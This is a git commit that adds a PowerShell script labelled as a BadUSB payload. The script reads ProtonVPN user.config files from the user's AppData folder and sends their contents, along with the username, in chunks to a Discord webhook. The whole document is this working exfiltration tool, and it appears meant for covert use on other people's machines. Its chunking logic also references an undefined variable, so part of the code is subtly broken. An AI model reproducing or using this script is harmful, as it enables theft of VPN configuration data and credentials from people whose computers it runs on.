d8b5af09bba88fdf94ad1dabd84fe82da315bf6c
Alessandro <alessandrogreco@duck.com>
2023-01-04 16:59:43 +0100

    Add files via upload

---
+++ [BADUSB] ProtonVPN Config File/ProtonVPN-config.ps1
@@ -0,0 +1,40 @@
+$Path = "$Env:USERPROFILE\AppData\Local\ProtonVPN\ProtonVPN*\*\user.config"
+
+$Content = Get-Content -Path $Path
+
+$text = $Path + $Content
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+# Discord Connection
+$hookurl = "$discord"
+
+# Loop for Discord
+$ConstantLimitForRestMethod = 1999
+$TMP_Body = @{
+	'username' = $env:username
+	'content' = ""
+}
+ for($i = 0; $i -lt $Body['content'].Length; $i+=$ConstantLimitForRestMethod){
+	try {
+		$TMP_Body = @{
+  			'username' = $env:username
+  			'content' = $text.Substring($i, $ConstantLimitForRestMethod)
+		}
+	} catch [ArgumentOutOfRangeException] {
+		if($tmp.Length-$i -gt 0){
+			$TMP_Body = @{
+  			'username' = $env:username
+  			'content' = $text.Substring($i, $tmp.Length-$i)
+			}
+		} else {
+			break
+		}
+	}
+	Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($TMP_Body | ConvertTo-Json)
+}
+
+
